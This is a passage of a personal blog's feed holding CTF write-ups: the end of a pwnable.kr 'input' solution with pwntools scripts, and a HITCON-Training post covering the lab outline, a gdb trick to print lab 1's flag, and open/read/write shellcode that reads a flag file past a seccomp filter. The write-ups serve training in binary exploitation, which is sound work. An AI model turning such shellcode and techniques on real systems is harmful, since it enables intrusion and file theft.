id="Stage-3-clear"><a href="#Stage-3-clear" class="headerlink" title="Stage 3 clear!"></a>Stage 3 clear!</h2><p>also use process.</p><h2 id="Stage-4-clear"><a href="#Stage-4-clear" class="headerlink" title="Stage 4 clear!"></a>Stage 4 clear!</h2><p>It open a file named <code>\x0a</code> that mean newline in program, but don’t care it. Start to write in file like Stage 2.</p><p><code>fread</code></p><ul><li><code>size_t fread(void *__restrict__ __ptr, size_t __size, size_t __n, FILE *__restrict__ __stream)</code></li><li>Read chunks of generic data from STREAM.</li><li>return: This number equals the number of bytes transferred only when size is 1. If  an error  occurs,  or  the end of the file is reached, the return value is a short item count (or zero).</li></ul><p><code>memcpy</code></p><ul><li><code>int memcmp(const void *__s1, const void *__s2, size_t __n)</code></li><li>Compare N bytes of S1 and S2.</li></ul><h2 id="Stage-5-clear"><a href="#Stage-5-clear" class="headerlink" title="Stage 5 clear!"></a>Stage 5 clear!</h2><p>create a new endpoint for communication, usually 127.0.0.1 as host, 9999 as port(out can link).</p><p>use <code>remote</code> in pwntools.</p><ul><li>AF_INET: IPv4 Internet protocols, remote support both IPv4 and IPv6.</li><li>INADDR_ANY: <code>\#define INADDR_ANY ((in_addr_t) 0x00000000)</code>, we can use any address we want.</li><li><code>htons( atoi(argv['C']) )</code>: depend on we set value on <code>argv['C']</code></li><li><code>bind</code><ul><li>bind a name to a socket</li><li><code>int bind(int __fd, const struct sockaddr *__addr, socklen_t __len)</code></li><li>Traditionally, this operation is called “assigning a name to a socket”.</li></ul></li></ul><p>code:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'stderr'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">b'\x00\x0a\x02\xff'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'\x0a'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">b'\x00\x00\x00\x00'</span>)</span><br><span class="line"></span><br><span class="line">argv =  [<span class="string">'/home/input2/input'</span>]</span><br><span class="line">argv += [<span class="string">'f'</span>] * (<span class="built_in">ord</span>(<span class="string">'A'</span>) - <span class="number">1</span>)</span><br><span class="line">argv += [<span class="string">'\x00'</span>]</span><br><span class="line">argv += [<span class="string">'\x20\x0a\x0d'</span>]</span><br><span class="line">argv += [<span class="string">'8878'</span>]</span><br><span class="line">argv += [<span class="string">'f'</span>] * (<span class="number">100</span> - <span class="built_in">len</span>(argv))</span><br><span class="line"></span><br><span class="line">stderr = <span class="built_in">open</span>(<span class="string">'./stderr'</span>, <span class="string">'rb'</span>)</span><br><span class="line"></span><br><span class="line">env = {<span class="string">'\xde\xad\xbe\xef'</span>: <span class="string">'\xca\xfe\xba\xbe'</span>}</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># sh = ssh(user='input2',host='pwnable.kr',port=2222,password='guest')</span></span><br><span class="line"></span><br><span class="line">    io = process(argv=argv, stderr=stderr, env=env)</span><br><span class="line"></span><br><span class="line">    io.sendline(<span class="string">b'\x00\x0a\x00\xff'</span>)     <span class="comment"># stdin</span></span><br><span class="line"></span><br><span class="line">    p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">8878</span>)       <span class="comment"># socket</span></span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">b'\xde\xad\xbe\xef'</span>)</span><br><span class="line"></span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>OMG! one write the exp in <code>/tmp/pwn</code>，admin’s soltion</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env/ python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.environ[<span class="string">'PWNLIB_NOTERM'</span>] = <span class="string">'1'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#argv</span></span><br><span class="line">stage1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    stage1.append(<span class="string">'a'</span>)</span><br><span class="line">stage1[<span class="number">65</span>] = <span class="string">'\x00'</span></span><br><span class="line">stage1[<span class="number">66</span>] = <span class="string">'\x20\x0a\x0d'</span></span><br><span class="line">stage1[<span class="number">67</span>] = <span class="string">'7021'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#stdio</span></span><br><span class="line"><span class="comment">#create a pipe,return (rear,write)</span></span><br><span class="line">fd1,data1 = os.pipe()</span><br><span class="line">fd2,data2 = os.pipe()</span><br><span class="line">os.write(data1,<span class="string">"\x00\x0a\x00\xff"</span>)</span><br><span class="line">os.write(data2,<span class="string">"\x00\x0a\x02\xff"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#env</span></span><br><span class="line">env = {<span class="string">'\xde\xad\xbe\xef'</span>:<span class="string">"\xca\xfe\xba\xbe"</span>}</span><br><span class="line"></span><br><span class="line"><span class="comment">#file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"\x0a"</span>,<span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">'\x00\x00\x00\x00'</span>)</span><br><span class="line"></span><br><span class="line">io = process(executable = <span class="string">'/home/input2/input'</span>,argv=stage1,stdin=fd1,stderr=fd2,env=env)</span><br><span class="line"><span class="comment">#network</span></span><br><span class="line">msg = remote(<span class="string">'localhost'</span>,<span class="number">7021</span>)</span><br><span class="line">msg.sendline(<span class="string">"\xde\xad\xbe\xef"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><ul><li><code>os.pipe</code>: create a pipe,return (rear, write), left one is “read out”, right one is “write in”.</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;h2 id=&quot;Stage-1-clear&quot;&gt;&lt;a href=&quot;#Stage-1-clear&quot; class=&quot;headerlink&quot; title=&quot;Stage 1 clear!&quot;&gt;&lt;/a&gt;Stage 1 clear!&lt;/h2&gt;&lt;p</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HITCON-train</title>
    <link href="http://im0use.github.io/2022/06/08/hitcon-train/"/>
    <id>http://im0use.github.io/2022/06/08/hitcon-train/</id>
    <published>2022-06-08T14:43:16.000Z</published>
    <updated>2022-05-29T01:03:06.993Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="HITCON-Training"><a href="#HITCON-Training" class="headerlink" title="HITCON-Training"></a>HITCON-Training</h1><p>For Linux binary Exploitation</p><h2 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h2><pre><code>git clone https://github.com/scwuaptx/HITCON-Training.git ~/cd HITCON-Training &amp;&amp; chmod u+x ./env_setup.sh &amp;&amp; ./env_setup.sh</code></pre><h2 id="Outline"><a href="#Outline" class="headerlink" title="Outline"></a>Outline</h2><ul><li><p>Basic Knowledge</p><ul><li>Introduction<ul><li>Reverse Engineering<ul><li>Static Analysis</li><li>Dynamic Analysis</li></ul></li><li>Exploitation</li><li>Useful Tool<ul><li>IDA PRO</li><li>GDB</li><li>Pwntool</li></ul></li><li>lab 1 - sysmagic</li></ul></li><li>Section</li><li>Compile,linking,assmbler</li><li>Execution<ul><li>how program get run</li><li>Segment</li></ul></li><li>x86 assembly<ul><li>Calling convention </li><li>lab 2 - open/read/write</li><li>shellcoding</li></ul></li></ul></li><li><p>Stack Overflow</p><ul><li>Buffer Overflow</li><li>Return to Text/Shellcode<ul><li>lab 3 - ret2shellcode</li></ul></li><li>Protection<ul><li>ASLR/DEP/PIE/StackGuard</li></ul></li><li>Lazy binding</li><li>Return to Library<ul><li>lab 4 - ret2lib</li></ul></li></ul></li><li><p>Return Oriented Programming</p><ul><li>ROP<ul><li>lab 5 - simple rop</li></ul></li><li>Using ROP bypass ASLR<ul><li>ret2plt</li></ul></li><li>Stack migration<ul><li>lab 6 - migration</li></ul></li></ul></li><li><p>Format String Attack</p><ul><li>Format String </li><li>Read from arbitrary memory<ul><li>lab 7 - crack</li></ul></li><li>Write to arbitrary memory<ul><li>lab 8 - craxme</li></ul></li><li>Advanced Trick<ul><li>EBP chain </li><li>lab 9 - playfmt</li></ul></li></ul></li><li><p>x64 Binary Exploitation</p><ul><li>x64 assembly</li><li>ROP</li><li>Format string Attack</li></ul></li><li><p>Heap exploitation</p><ul><li>Glibc memory allocator overview</li><li>Vulnerablility on heap<ul><li>Use after free<ul><li>lab 10 - hacknote</li></ul></li><li>Heap overflow <ul><li>house of force <ul><li>lab 11 - 1 - bamboobox1</li></ul></li><li>unlink<ul><li>lab 11 - 2 - bamboobox2</li></ul></li></ul></li></ul></li></ul></li><li><p>Advanced heap exploitation</p><ul><li>Fastbin attack<ul><li>lab 12 - babysecretgarden</li></ul></li><li>Shrink the chunk</li><li>Extend the chunk<ul><li>lab 13 -  heapcreator</li></ul></li><li>Unsortbin attack<ul><li>lab 14 - magicheap</li></ul></li></ul></li><li><p>C++ Exploitation</p><ul><li>Name Mangling </li><li>Vtable fucntion table</li><li>Vector &amp; String</li><li>New &amp; delete</li><li>Copy constructor &amp; assignment operator<ul><li>lab 15 - zoo</li></ul></li></ul></li><li><p>那些 Pwning 的奇淫技巧:</p></li></ul><h2 id="write-up"><a href="#write-up" class="headerlink" title="write up"></a>write up</h2><h2 id="LAB-1-sysmagic"><a href="#LAB-1-sysmagic" class="headerlink" title="LAB 1 [sysmagic]"></a>LAB 1 [sysmagic]</h2><blockquote><p>简单的 Symbolic Execution</p></blockquote><p>反编译发现输入<code>buf == v2</code>，buf是随机数，可以直接gdb调试。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( buf == v2 )</span><br><span class="line"><span class="comment">//  0x8048720 &lt;get_flag+389&gt;    cmp    edx, eax</span></span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x30</span>; ++i )</span><br><span class="line">      <span class="built_in">putchar</span>(v5[i] ^ v6[i + <span class="number">1</span>]);</span><br><span class="line">  }</span><br></pre></td></tr></table></figure><p>断点<code> 0x08048712 &lt;+375&gt;:   call   0x8048480 &lt;__isoc99_scanf@plt&gt;</code>，然后随便输入一个值，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *get_flag+375</span><br><span class="line">Breakpoint 1 at 0x8048712</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> <span class="variable">$eax</span>=<span class="variable">$edx</span></span><br><span class="line">pwndbg&gt; b *get_flag+471</span><br><span class="line">Note: breakpoint 2 also <span class="built_in">set</span> at pc 0x8048772.</span><br><span class="line">Breakpoint 3 at 0x8048772</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">CTF{debugger_1s_so_p0werful_1n_dyn4m1c_4n4lySis!}</span><br></pre></td></tr></table></figure><p>其实我在想另一种方法，就是既然变量都在程序里，我们也可以手动计算。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">main() {</span><br><span class="line">    <span class="type">char</span> v5[<span class="number">0x80</span>];</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x80</span>] = <span class="string">"BDo_you_know_why_my_teammate_Orange_is_so_angry???"</span>;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    v5[<span class="number">0</span>] = <span class="number">7</span>;</span><br><span class="line">    v5[<span class="number">1</span>] = <span class="number">59</span>;</span><br><span class="line">    v5[<span class="number">2</span>] = <span class="number">25</span>;</span><br><span class="line">    v5[<span class="number">3</span>] = <span class="number">2</span>;</span><br><span class="line">    v5[<span class="number">4</span>] = <span class="number">11</span>;</span><br><span class="line">    v5[<span class="number">5</span>] = <span class="number">16</span>;</span><br><span class="line">    v5[<span class="number">6</span>] = <span class="number">61</span>;</span><br><span class="line">    v5[<span class="number">7</span>] = <span class="number">30</span>;</span><br><span class="line">    v5[<span class="number">8</span>] = <span class="number">9</span>;</span><br><span class="line">    v5[<span class="number">9</span>] = <span class="number">8</span>;</span><br><span class="line">    v5[<span class="number">10</span>] = <span class="number">18</span>;</span><br><span class="line">    v5[<span class="number">11</span>] = <span class="number">45</span>;</span><br><span class="line">    v5[<span class="number">12</span>] = <span class="number">40</span>;</span><br><span class="line">    v5[<span class="number">13</span>] = <span class="number">89</span>;</span><br><span class="line">    v5[<span class="number">14</span>] = <span class="number">10</span>;</span><br><span class="line">    v5[<span class="number">15</span>] = <span class="number">0</span>;</span><br><span class="line">    v5[<span class="number">16</span>] = <span class="number">30</span>;</span><br><span class="line">    v5[<span class="number">17</span>] = <span class="number">22</span>;</span><br><span class="line">    v5[<span class="number">18</span>] = <span class="number">0</span>;</span><br><span class="line">    v5[<span class="number">19</span>] = <span class="number">4</span>;</span><br><span class="line">    v5[<span class="number">20</span>] = <span class="number">85</span>;</span><br><span class="line">    v5[<span class="number">21</span>] = <span class="number">22</span>;</span><br><span class="line">    v5[<span class="number">22</span>] = <span class="number">8</span>;</span><br><span class="line">    v5[<span class="number">23</span>] = <span class="number">31</span>;</span><br><span class="line">    v5[<span class="number">24</span>] = <span class="number">7</span>;</span><br><span class="line">    v5[<span class="number">25</span>] = <span class="number">1</span>;</span><br><span class="line">    v5[<span class="number">26</span>] = <span class="number">9</span>;</span><br><span class="line">    v5[<span class="number">27</span>] = <span class="number">0</span>;</span><br><span class="line">    v5[<span class="number">28</span>] = <span class="number">126</span>;</span><br><span class="line">    v5[<span class="number">29</span>] = <span class="number">28</span>;</span><br><span class="line">    v5[<span class="number">30</span>] = <span class="number">62</span>;</span><br><span class="line">    v5[<span class="number">31</span>] = <span class="number">10</span>;</span><br><span class="line">    v5[<span class="number">32</span>] = <span class="number">30</span>;</span><br><span class="line">    v5[<span class="number">33</span>] = <span class="number">11</span>;</span><br><span class="line">    v5[<span class="number">34</span>] = <span class="number">107</span>;</span><br><span class="line">    v5[<span class="number">35</span>] = <span class="number">4</span>;</span><br><span class="line">    v5[<span class="number">36</span>] = <span class="number">66</span>;</span><br><span class="line">    v5[<span class="number">37</span>] = <span class="number">60</span>;</span><br><span class="line">    v5[<span class="number">38</span>] = <span class="number">44</span>;</span><br><span class="line">    v5[<span class="number">39</span>] = <span class="number">91</span>;</span><br><span class="line">    v5[<span class="number">40</span>] = <span class="number">49</span>;</span><br><span class="line">    v5[<span class="number">41</span>] = <span class="number">85</span>;</span><br><span class="line">    v5[<span class="number">42</span>] = <span class="number">2</span>;</span><br><span class="line">    v5[<span class="number">43</span>] = <span class="number">30</span>;</span><br><span class="line">    v5[<span class="number">44</span>] = <span class="number">33</span>;</span><br><span class="line">    v5[<span class="number">45</span>] = <span class="number">16</span>;</span><br><span class="line">    v5[<span class="number">46</span>] = <span class="number">76</span>;</span><br><span class="line">    v5[<span class="number">47</span>] = <span class="number">30</span>;</span><br><span class="line">    v5[<span class="number">48</span>] = <span class="number">0x42</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x30</span>; ++i )</span><br><span class="line">        <span class="built_in">putchar</span>(v5[i] ^ buf[i + <span class="number">1</span>]);</span><br><span class="line">}</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sb@xulun:~/pwn/HITCON-Training/LAB/lab1$ ./calc </span><br><span class="line">CTF{debugger_1s_so_p0werful_1n_dyn4m1c_4n4lySis!}</span><br></pre></td></tr></table></figure><h2 id="LAB-2-orw-bin"><a href="#LAB-2-orw-bin" class="headerlink" title="LAB 2 [orw.bin]"></a>LAB 2 [orw.bin]</h2><h3 id="syscall-shellcode"><a href="#syscall-shellcode" class="headerlink" title="syscall   :   shellcode"></a>syscall   :   shellcode</h3><p>跟pwnable.tw的orw应该是同一题，翻了翻互联网的wp，记录一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Only open read write syscall are allowed to use.</span><br></pre></td></tr></table></figure><p>main</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  orw_seccomp();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give my your shellcode:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;shellcode, <span class="number">0xC8</span>u);</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))shellcode)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>orw_seccomp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">orw_seccomp</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  __int16 v1; <span class="comment">// [esp+4h] [ebp-84h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// [esp+8h] [ebp-80h]</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">96</span>]; <span class="comment">// [esp+Ch] [ebp-7Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+6Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  qmemcpy(v3, &amp;unk_8048640, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  v1 = <span class="number">12</span>;</span><br><span class="line">  v2 = v3;</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>关注prctl</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_SECCOMP22</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If no_new_privs is set, then operations that grant new privileges (i.e.</span></span><br><span class="line"><span class="comment"> * execve) will either fail or not grant them.  This affects suid/sgid,</span></span><br><span class="line"><span class="comment"> * file capabilities, and LSMs.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Operations that merely manipulate or drop existing privileges (setresuid,</span></span><br><span class="line"><span class="comment"> * capset, etc.) will still work.  Drop those privileges if you want them gone.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Changing LSM security domain is considered a new privilege.  So, for example,</span></span><br><span class="line"><span class="comment"> * asking selinux for a specific new context (e.g. with runcon) will result</span></span><br><span class="line"><span class="comment"> * in execve returning -EPERM.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_NO_NEW_PRIVS38</span></span><br><span class="line">prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>);<span class="comment">// use the SECCOMP_SET_MODE_FILTER operation</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sb@xulun:~/pwn/HITCON-Training/LAB/lab2$ seccomp-tools dump ./orw</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x09 0x40000003  <span class="keyword">if</span> (A != ARCH_I386) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x07 0x00 0x000000ad  <span class="keyword">if</span> (A == rt_sigreturn) goto 0011</span><br><span class="line"> 0004: 0x15 0x06 0x00 0x00000077  <span class="keyword">if</span> (A == sigreturn) goto 0011</span><br><span class="line"> 0005: 0x15 0x05 0x00 0x000000fc  <span class="keyword">if</span> (A == exit_group) goto 0011</span><br><span class="line"> 0006: 0x15 0x04 0x00 0x00000001  <span class="keyword">if</span> (A == <span class="built_in">exit</span>) goto 0011</span><br><span class="line"> 0007: 0x15 0x03 0x00 0x00000005  <span class="keyword">if</span> (A == open) goto 0011</span><br><span class="line"> 0008: 0x15 0x02 0x00 0x00000003  <span class="keyword">if</span> (A == <span class="built_in">read</span>) goto 0011</span><br><span class="line"> 0009: 0x15 0x01 0x00 0x00000004  <span class="keyword">if</span> (A == write) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00050026  <span class="built_in">return</span> ERRNO(38)</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br></pre></td></tr></table></figure><p>系统过滤，系统调用函数中只有open，read，write能够进入下一步。</p><p>参考<a href="https://mineta.tistory.com/141">一个师傅</a>的做法，首先使用open打开flag，然后用read读取flag，最后通过stdout输出到屏幕。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> fd = sys_open(<span class="string">"/home/orw/flag"</span>);</span><br><span class="line">sys_read(fd, flag, <span class="number">0x30</span>);</span><br><span class="line">sys_write(<span class="number">1</span>, flag, <span class="number">0x30</span>); </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A060                 public shellcode</span><br><span class="line">.bss:0804A060 shellcode       db    ? ;               ; CODE XREF: main+42↑p</span><br><span class="line">.bss:0804A060                                         ; DATA XREF: main+2E↑o ...</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">该师傅的</span><br><span class="line">栈布局：</span><br><span class="line">shellcode at (.bss) 0x0804A060</span><br><span class="line">code at shellcode+0x0, data at shellcode+0x80(0x0804A0E0)</span><br><span class="line">data+0x0   : /home/orw/flag</span><br><span class="line">data+0x20  : [flag]</span><br></pre></td></tr></table></figure><p>我的观察：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">read正下方的一些指令</span><br><span class="line">add    esp,0x10</span><br><span class="line">mov    eax,0x804a060 # shellcode</span><br><span class="line">call   eax</span><br></pre></td></tr></table></figure><p>eax作为返回值，当我们传入open(path)返回的文件描述符（见pwnable.kr的fd），一个FILE流的句柄，可以有该句柄读入到另一个寄存器(edi还是esp都可以，我们只是需要一个地址去存放)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shellcode =  <span class="string">''</span></span><br><span class="line"><span class="comment"># flag file open</span></span><br><span class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">'/home/orw/flag'</span>)</span><br><span class="line"><span class="comment"># read -&gt; input</span></span><br><span class="line">shellcode += shellcraft.read(<span class="string">'eax'</span>, <span class="string">'edi'</span>, <span class="number">100</span>)</span><br><span class="line"><span class="comment"># write -&gt; output</span></span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, <span class="string">'edi'</span>, <span class="number">100</span>)</span><br></pre></td></tr></table></figure><p>对于汇编的知识，</p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;h1 id=&quot;HITCON-Training&quot;&gt;&lt;a href=&quot;#HITCON-Training&quot; class=&quot;headerlink&quot; title=&quot;HITCON-Training&quot;&gt;&lt;/a&gt;HITCON-Training&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>malloc</title>
    <link href="http://im0use.github.io/2022/06/05/malloc/"/>
    <id>http://im0use.github.io/2022/06/05/malloc/</id>
